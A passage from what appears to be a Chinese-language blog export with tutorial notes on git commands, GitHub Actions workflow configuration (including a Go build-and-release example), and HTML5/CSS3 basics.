hello.py</span><br><span class="line">git add hello.py</span><br><span class="line">git commit -m &quot;update hello.py&quot;</span><br><span class="line">git switch dev</span><br><span class="line">echo &quot;name=input(&#x27;your name: &#x27;)\nprint(&#x27;hello, &#123;&#125;&#x27;.format(name))&quot; &gt;&gt; hello.py</span><br><span class="line">git commit -am &quot;dev 0.2: update hello.py&quot;</span><br><span class="line">git switch master</span><br><span class="line">git merge dev</span><br><span class="line">git status</span><br><span class="line">vim hello.py  # 修复冲突</span><br><span class="line">git commit -a / git merge --continue</span><br></pre></td></tr></table></figure>

<h4 id="查看差异"><a href="#查看差异" class="headerlink" title="查看差异"></a>查看差异</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo checkofdiff &gt; baz.txt</span><br><span class="line">git diff  # 查看工作区/暂存区的差异</span><br><span class="line">git add baz.txt</span><br><span class="line">git diff --staged   # 查看暂存区/上一次commit的差异</span><br></pre></td></tr></table></figure>

<h4 id="回退"><a href="#回退" class="headerlink" title="回退"></a>回退</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尚未添加到暂存区时</span></span><br><span class="line">git status</span><br><span class="line">echo junkdata &gt;&gt; baz.txt</span><br><span class="line">git diff</span><br><span class="line">git restore baz.txt     # 取回暂存区的版本到工作区</span><br><span class="line">cat baz.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改内容已添加到暂存区时</span></span><br><span class="line">echo junkdata &gt;&gt; baz.txt</span><br><span class="line">git add baz.txt</span><br><span class="line">git reset HEAD baz.txt  # 暂存区的修改撤销，移回到工作区</span><br><span class="line">git diff</span><br><span class="line">git restore baz.txt     # 再取回暂存区版本到工作区，彻底放弃暂存区的修改</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改内容已经提交到了仓库时</span></span><br><span class="line">echo junkdata &gt;&gt; baz.txt</span><br><span class="line">git commit -am &quot;add junkdata&quot;</span><br><span class="line">git reset --hard HEAD^  # 回退仓库和所有区，HEAD^表示第一个父级提交(也就是最近的一次提交)</span><br><span class="line">          --soft HEAD^  # 仅回退仓库</span><br><span class="line">          --mixed HEAD^ # 回退仓库和暂存区</span><br><span class="line"></span><br><span class="line">git reset --hard &lt;commit id&gt;  # 回退的指定的某个提交状态，之后的记录全部删除</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200218115929811.png" alt="image-20200218115929811"></p>
<h4 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:ex7l0it/git_learning.git</span><br><span class="line">git push -u origin main</span><br><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">git clone https://github.com/ex7l0it/git_learning.git remote_git_learning</span><br><span class="line">cd remote_git_learning</span><br><span class="line">git fetch  # 将远程主机的最新内容拉到本</span><br><span class="line">git pull   # 将远程主机的最新内容拉下来后直接合并, 等于 git fetch + git merge</span><br></pre></td></tr></table></figure>

<h4 id="Github相关"><a href="#Github相关" class="headerlink" title="Github相关"></a>Github相关</h4><ul>
<li>配置 SSH Key： <a href="https://github.com/settings/keys">https://github.com/settings/keys</a><ul>
<li>可通过 SSH 协议进行身份认证，进行 clone、push 等操作</li>
</ul>
</li>
<li>生成 Personal Access Tokens 👉 <a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a><ul>
<li>推荐使用新出的细粒度的 Personal Access Token 👉 <a href="https://github.com/settings/personal-access-tokens/">https://github.com/settings/personal-access-tokens/</a><ul>
<li>可针对指定仓库进行细粒度的配置</li>
</ul>
</li>
<li>可通过 HTTPS 协议进行身份认证</li>
</ul>
</li>
</ul>
<h2 id="三、更多命令及应用场景"><a href="#三、更多命令及应用场景" class="headerlink" title="三、更多命令及应用场景"></a>三、更多命令及应用场景</h2><h3 id="1-当你已经更改了很多内容，突然发现需要把修改的内容移动到新分支"><a href="#1-当你已经更改了很多内容，突然发现需要把修改的内容移动到新分支" class="headerlink" title="1. 当你已经更改了很多内容，突然发现需要把修改的内容移动到新分支"></a>1. 当你已经更改了很多内容，突然发现需要把修改的内容移动到新分支</h3><ul>
<li>解决方案：使用 <code>git stash</code> 进行暂存工作</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash # 保存当前工作区修改的内容</span><br><span class="line">git switch -c dev # 创建并切换到新分支</span><br><span class="line">git stash pop # 将暂存的修改内容还原到新分支上</span><br></pre></td></tr></table></figure>

<p><code>git stash</code> 相关命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存工作现场</span></span><br><span class="line">git stash </span><br><span class="line">git stash save # 加不加 save 都一样的效果</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将最新的 stash 内容应用到当前工作区，并从列表中移除</span></span><br><span class="line">git stash pop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有保存的 stash 列表</span></span><br><span class="line">git stash list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将最新的 stash 内容应用到当前工作区，但不从列表中移除</span></span><br><span class="line">git stash apply</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除掉最新的 stash</span></span><br><span class="line">git stash drop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除掉列表中所有的 stash</span></span><br><span class="line">git stash clear</span><br></pre></td></tr></table></figure>

<h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3>]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>助教课件</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Actions Workflows 使用</title>
    <url>/2023/09/07/GithubActions/</url>
    <content><![CDATA[<h1 id="Github-Actions-workflows"><a href="#Github-Actions-workflows" class="headerlink" title="Github Actions workflows"></a>Github Actions workflows</h1><ul>
<li>Workflows 是一个可以配置的自动化流程</li>
<li>它通过 YAML 文件定义，存放在仓库的 <code>.github/workflows</code> 目录中</li>
<li>可以有多个工作流，可以手动触发也可自动触发</li>
<li>免费版本每月有 2000 分钟的使用资源，也足够用了</li>
</ul>
<blockquote>
<p>如果想要系统的学习 Github Actions，可以直接查看<a href="https://docs.github.com/zh/actions">👉 📘官方文档 👈</a>进行学习</p>
</blockquote>
<p>后面的内容就基于基本的文件内容和本人遇到的实际需求来写了，存个档方便以后忘了回来 Ctrl CV 🤔</p>
<h2 id="yml-工作流配置文件"><a href="#yml-工作流配置文件" class="headerlink" title="yml 工作流配置文件"></a>yml 工作流配置文件</h2><ul>
<li>第一步在仓库的 <code>.github/workflows</code> 下随便创建一个 <code>.yml</code> 文件 (例如 <code>demo.yml</code>)</li>
<li>直接从官方文档上复制的例子:</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里 name 是可选项，如果指定了 name, 它会显示在 Github 仓库的 Actions 页面里，实际操作一下就晓得了</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">learn-github-actions</span></span><br><span class="line"><span class="comment"># 这里 run-name 也是可选项(从来没用过, 需要了解的话官方文档里有解释)</span></span><br><span class="line"><span class="attr">run-name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.actor</span> <span class="string">&#125;&#125;</span> <span class="string">is</span> <span class="string">learning</span> <span class="string">GitHub</span> <span class="string">Actions</span></span><br><span class="line"><span class="comment"># on 用来指定这个工作流的触发器(也就是什么时候执行工作流)</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"><span class="comment"># jobs 里头指定要执行的作业任务</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="comment"># 这里是定义了一个名为 check-bats-version 的作业 (这个名可以随便起</span></span><br><span class="line">  <span class="attr">check-bats-version:</span></span><br><span class="line">    <span class="comment"># runs-on 定义这个作业运行在什么系统环境下</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="comment"># steps 下面是这个作业的执行步骤</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="comment"># 第一步调用 actions/checkout@v3 这个操作</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">      <span class="comment"># 第二步调用 actions/setup-node@v3 这个操作，并携带运行参数</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;14&#x27;</span></span><br><span class="line">      <span class="comment"># 第三步执行命令</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">bats</span></span><br><span class="line">      <span class="comment"># 第四步执行命令</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">bats</span> <span class="string">-v</span></span><br></pre></td></tr></table></figure>

<h2 id="on-触发工作流"><a href="#on-触发工作流" class="headerlink" title="on 触发工作流"></a>on 触发工作流</h2><ul>
<li>👉 <a href="https://docs.github.com/zh/actions/using-workflows/triggering-a-workflow">📘如何自动触发 GitHub Actions 工作流程</a> </li>
<li>详细的触发事件说明 👉 <a href="https://docs.github.com/zh/actions/using-workflows/events-that-trigger-workflows">📘触发工作流的事件</a></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 */24 * * *&quot;</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">    <span class="attr">tags:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">v*</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>workflow_dispatch:</code> 可指定手动触发工作流，效果看<a href="https://docs.github.com/zh/actions/using-workflows/manually-running-a-workflow">📘这里</a></li>
<li><code>schedule:</code> 可在计划时间触发工作流(<a href="https://crontab.guru/">crontab</a>)，具体说明看<a href="https://docs.github.com/zh/actions/using-workflows/events-that-trigger-workflows#schedule">📘这里</a></li>
<li><code>push:</code> 这里指定的是在 <code>master</code> 分支上有人推送时或有人推送以 <code>v</code> 开头的 <code>tag</code> 时会触发，具体的说明看<a href="https://docs.github.com/zh/actions/using-workflows/events-that-trigger-workflows#push">这里</a></li>
</ul>
<h2 id="job-作业内容"><a href="#job-作业内容" class="headerlink" title="job 作业内容"></a>job 作业内容</h2><ul>
<li>在 Github <a href="https://github.com/marketplace?type=actions">👉 Marketplace</a> 上有很多 actions<ul>
<li>可以直接在上面搜关键词寻找满足自己需求的操作<ul>
<li>例如环境配置</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>一些常用的 actions:</p>
<ul>
<li>📌<a href="https://github.com/marketplace/actions/checkout">actions&#x2F;checkout@v4</a><ul>
<li>用于将当前仓库拉取到工作流中</li>
<li>复杂的需求查看链接中的使用说明即可</li>
</ul>
</li>
<li>📌<a href="https://github.com/marketplace/actions/upload-a-build-artifact">actions&#x2F;upload-artifact@v3</a></li>
<li>📌<a href="https://github.com/marketplace/actions/download-a-build-artifact">actions&#x2F;download-artifact@v3</a><ul>
<li>用于在不同的作业中共享数据</li>
<li>upload 时 name 写一个用于标识的名字，path 写要上传的文件路径</li>
<li>download 时 name 写 upload 时配置的名字，path 可选(指定保存到哪里)</li>
</ul>
</li>
<li>📌<a href="https://github.com/actions/create-release">actions&#x2F;create-release@v1</a><ul>
<li>用于创建 release</li>
</ul>
</li>
<li>📌<a href="https://github.com/actions/upload-release-asset">actions&#x2F;upload-release-asset@v1</a><ul>
<li>用于向 release 上传文件</li>
</ul>
</li>
<li>📌<a href="https://github.com/marketplace/actions/github-push">ad-m&#x2F;github-push-action@master</a><ul>
<li>用于向目标仓库进行 push 操作</li>
</ul>
</li>
<li>📌<a href="https://github.com/theme-keep/hexo-deploy-github-pages-action">theme-keep&#x2F;hexo-deploy-github-pages-action@master</a><ul>
<li>用于自动部署 hexo 博客</li>
</ul>
</li>
</ul>
<h2 id="Secrets"><a href="#Secrets" class="headerlink" title="Secrets"></a>Secrets</h2><p>在一些 actions 的使用模板中可能会看到类似这样的内容：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">shell:</span> <span class="string">bash</span></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">      <span class="attr">SUPER_SECRET:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.SuperSecret</span> <span class="string">&#125;&#125;</span></span><br><span class="line">    <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">      <span class="string">example-command</span> <span class="string">&quot;$SUPER_SECRET&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里的 secrets 可以认为是 Github Actions 工作流程的变量值，这个值只能有仓库管理员进行添加修改，可以用于传递密码、限制权限等<ul>
<li>详细的说明看这里 👉 <a href="https://docs.github.com/zh/actions/security-guides/using-secrets-in-github-actions">Using secrets in GitHub Actions</a></li>
</ul>
</li>
<li>⚠️ 注意这里有一个特别的 secret 👉 <code>secrets.GITHUB_TOKEN</code><ul>
<li>这是 Github 自动创建的一个唯一的 secret(不能手动创建)，可以在工作流中进行身份验证，详细说明看<a href="https://docs.github.com/zh/actions/security-guides/automatic-token-authentication">📘这里</a></li>
<li>使用到这个值的操作可能需要写权限，默认是只读权限，添加写权限需要到操作的仓库设置中的 <code>Actions -&gt; General -&gt; Workflow permissions</code> 中将其值修改为 <code>Read and write permissions</code></li>
</ul>
</li>
</ul>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="自动编译并发布"><a href="#自动编译并发布" class="headerlink" title="自动编译并发布"></a>自动编译并发布</h3><ul>
<li>例如需要将一个 Go 的项目自动编译并发布 Release<ul>
<li>具体需求是当用户将以 <code>v</code> 开头的 <code>tag</code> push 到仓库时自动执行：<ul>
<li>编译该项目并将编译的程序 <code>target</code> 压缩为 <code>target-linux-amd64.tar.gz</code></li>
<li>发布一个同 tag 名的 Release，并将打包好的 <code>tar.gz</code> 文件上传到 Release 中</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">build</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">tags:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;v*&quot;</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build_and_publish:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Build</span> <span class="string">and</span> <span class="string">Publish</span> <span class="string">Release</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v4</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">and</span> <span class="string">Compress</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">| </span></span><br><span class="line"><span class="string">          go build -o target . </span></span><br><span class="line"><span class="string">          tar zcvf target-linux-amd64.tar.gz target</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Crate</span> <span class="string">a</span> <span class="string">Release</span></span><br><span class="line">        <span class="attr">id:</span> <span class="string">create_release</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/create-release@v1</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">            <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">            <span class="attr">tag_name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.ref</span> <span class="string">&#125;&#125;</span></span><br><span class="line">            <span class="attr">release_name:</span> <span class="string">Release</span> <span class="string">$&#123;&#123;</span> <span class="string">github.ref</span> <span class="string">&#125;&#125;</span></span><br><span class="line">            <span class="attr">draft:</span> <span class="literal">false</span></span><br><span class="line">            <span class="attr">prerelease:</span> <span class="literal">false</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Upload</span> <span class="string">Release</span> <span class="string">Asset</span></span><br><span class="line">        <span class="attr">id:</span> <span class="string">upload-release-asset</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/upload-release-asset@v1</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">upload_url:</span> <span class="string">$&#123;&#123;</span> <span class="string">steps.create_release.outputs.upload_url</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">asset_path:</span> <span class="string">./target-linux-amd64.tar.gz</span></span><br><span class="line">          <span class="attr">asset_name:</span> <span class="string">target-linux-amd64.tar.gz</span></span><br><span class="line">          <span class="attr">asset_content_type:</span> <span class="string">application/gzip</span></span><br></pre></td></tr></table></figure>

<h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3>]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML &amp; CSS</title>
    <url>/2019/12/06/HTML5CSS3/</url>
    <content><![CDATA[<h1 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h1><h2 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;关键字1,关键字2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;网站描述&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;3;url=https://www.baidu.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 设置视口大小 device-width表示设备的宽度（完美视口） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width， initial-scale=1.0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="其他标签"><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h2><h3 id="hgroup标签"><a href="#hgroup标签" class="headerlink" title="hgroup标签"></a>hgroup标签</h3><p>用来为标题分组，可以将一组相关的标题同时放到hgroup中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hgroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hgroup</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="引用标签"><a href="#引用标签" class="headerlink" title="引用标签"></a>引用标签</h3><p>blockquote表示一个长引用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span></span><br><span class="line">    引用内容</span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>q表示一个短引用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">子曰：<span class="tag">&lt;<span class="name">q</span>&gt;</span>学而时习之，不亦说乎<span class="tag">&lt;/<span class="name">q</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="下拉列表"><a href="#下拉列表" class="headerlink" title="下拉列表"></a>下拉列表</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>选项1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>选项2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>选项3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="块元素-行内元素"><a href="#块元素-行内元素" class="headerlink" title="块元素 行内元素"></a>块元素 行内元素</h2><p><strong>块元素</strong>（Block Element）</p>
<p>网页中一般通过块元素来进行页面布局</p>
<p><strong>行内元素</strong>（Inline Element）</p>
<p>主要用来包裹文字，一般情况下会在块元素中放行内元素</p>
<h2 id="布局标签"><a href="#布局标签" class="headerlink" title="布局标签"></a>布局标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 表示网页头部 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 表示网页主体(一个页面中只有一个) --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 表示网页底部 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 导航 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 表示和主体相关的内容(侧边栏) --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 表示一个独立的文章 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 表示一个独立的区块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="图片格式"><a href="#图片格式" class="headerlink" title="图片格式"></a>图片格式</h2><table>
<thead>
<tr>
<th>图片格式</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>jpeg(jpg)</code></td>
<td>支持的颜色比较丰富，不支持透明效果，不支持动图，一般用来显示照片</td>
</tr>
<tr>
<td><code>gif</code></td>
<td>支持的颜色比较少，支持简单透明，支持动图</td>
</tr>
<tr>
<td><code>png</code></td>
<td>支持的颜色丰富，支持复杂透明，不支持动图 （专为网页而生）</td>
</tr>
<tr>
<td><code>webp</code></td>
<td></td>
</tr>
</tbody></table>
<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><ul>
<li><code>autocomplete=&quot;off&quot;</code> 关闭自动补全</li>
<li><code>readonly</code> 将表单项设置为只读，数据会提交</li>
<li><code>disabled</code> 将表单项设置为禁用，数据不会提交</li>
<li><code>autofocus</code> 设置表单项自动获取焦点</li>
</ul>
<h1 id="CSS3"><a href="#CSS3" class="headerlink" title="CSS3"></a>CSS3</h1><h2 id="CSS工具网页"><a href="#CSS工具网页" class="headerlink" title="CSS工具网页"></a>CSS工具网页</h2><ol>
<li>颜色板： <ul>
<li><a href="https://flatuicolors.com/">https://flatuicolors.com/</a></li>
<li><a href="https://www.materialpalette.com/colors">https://www.materialpalette.com/colors</a></li>
</ul>
</li>
<li>CSS代码片段： <a href="http://caibaojian.com/30-seconds-of-css/">http://caibaojian.com/30-seconds-of-css/</a></li>
</ol>
<h2 id="选择器权重"><a href="#选择器权重" class="headerlink" title="选择器权重"></a>选择器权重</h2><table>
<thead>
<tr>
<th>选择器</th>
<th>权重</th>
</tr>
</thead>
<tbody><tr>
<td>内联样式</td>
<td>1000</td>
</tr>
<tr>
<td>id选择器</td>
<td>100</td>
</tr>
<tr>
<td>类和伪类选择器</td>
<td>10</td>
</tr>
<tr>
<td>元素选择器</td>
<td>1</td>
</tr>
</tbody></table>
<h2 id="长度单位"><a href="#长度单位" class="headerlink" title="长度单位"></a>长度单位</h2><p><strong>像素</strong></p>
<p><strong>百分比</strong>：</p>
<p>可以将属性值设置为相对于父元素属性的百分比</p>
<p><strong>em</strong></p>
<p>em是相对于元素的字体大小来计算的</p>
<p>1em &#x3D; 1 font-size</p>
<p><strong>rem</strong></p>
<p>rem是相对于根元素（html）字体大小来计算的</p>
<h3 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h3><h4 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h4><p>RGB通过三种颜色的不同深度来调配出不同的颜色。</p>
<p>语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-color</span>: <span class="built_in">rgb</span>(红色,绿色,蓝色);</span><br></pre></td></tr></table></figure>

<h4 id="RGBA"><a href="#RGBA" class="headerlink" title="RGBA"></a>RGBA</h4><p>在RGB的基础上增加一个a表示不透明度</p>
<h4 id="十六进制RGB值"><a href="#十六进制RGB值" class="headerlink" title="十六进制RGB值"></a>十六进制RGB值</h4><p>颜色浓度通过 00-ff</p>
<p>如果颜色两位两位重复可以进行简写：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#aabbcc--</span>&gt;<span class="selector-id">#abc</span></span><br></pre></td></tr></table></figure>

<p>语法：#红色绿色蓝色</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-color</span>: <span class="number">#ff0000</span>;</span><br></pre></td></tr></table></figure>

<h4 id="HSL值"><a href="#HSL值" class="headerlink" title="HSL值"></a>HSL值</h4><p>H 色相（0-360）</p>
<p>S 饱和度，颜色的浓度 （0%-100%）</p>
<p>L 亮度，颜色的亮度 （0%-100%）</p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">inherit // 继承</span><br><span class="line">transparent // 透明</span><br></pre></td></tr></table></figure>



<h2 id="CSS布局"><a href="#CSS布局" class="headerlink" title="CSS布局"></a>CSS布局</h2><blockquote>
<p><a href="http://zh.learnlayout.com/toc.html">http://zh.learnlayout.com/toc.html</a></p>
</blockquote>
<h3 id="文档流"><a href="#文档流" class="headerlink" title="文档流"></a>文档流</h3><p>normal flow</p>
<ul>
<li>网页是一个多层的结构，一层摞一层。</li>
<li>通过CSS可以分别为每一层来设置样式</li>
<li>作为用户来讲只能看到最顶上一层</li>
<li>最底下一层称为文档流，文档流是网页的基础</li>
<li>元素在文档流中的特点：<ul>
<li>块元素<ul>
<li>块元素会在页面中独占一行</li>
<li>默认宽度是父元素的全部（会把父元素撑满）</li>
<li>默认高度是被内容撑开（子元素）</li>
</ul>
</li>
<li>行内元素<ul>
<li>行内元素不会独占页面的一行，只占自身的大小</li>
<li>行内元素在页面中左向右平行排列，如果一行之中不能容纳所有的行内元素，则元素会换到第二行继续自左向右排列</li>
<li>行内元素的默认宽度和高度都是被内容撑开</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="display属性"><a href="#display属性" class="headerlink" title="display属性"></a><code>display</code>属性</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">display</span>: block;			<span class="comment">/*块级元素(自动换行)*/</span></span><br><span class="line"><span class="attribute">display</span>: inline;		<span class="comment">/*行内元素*/</span></span><br><span class="line"><span class="attribute">display</span>: none;			<span class="comment">/*隐藏(不占据原显示空间)*/</span></span><br><span class="line">  <span class="selector-attr">[visibility: hidden;]</span> <span class="comment">/*隐藏(占据原显示空间)*/</span></span><br></pre></td></tr></table></figure>

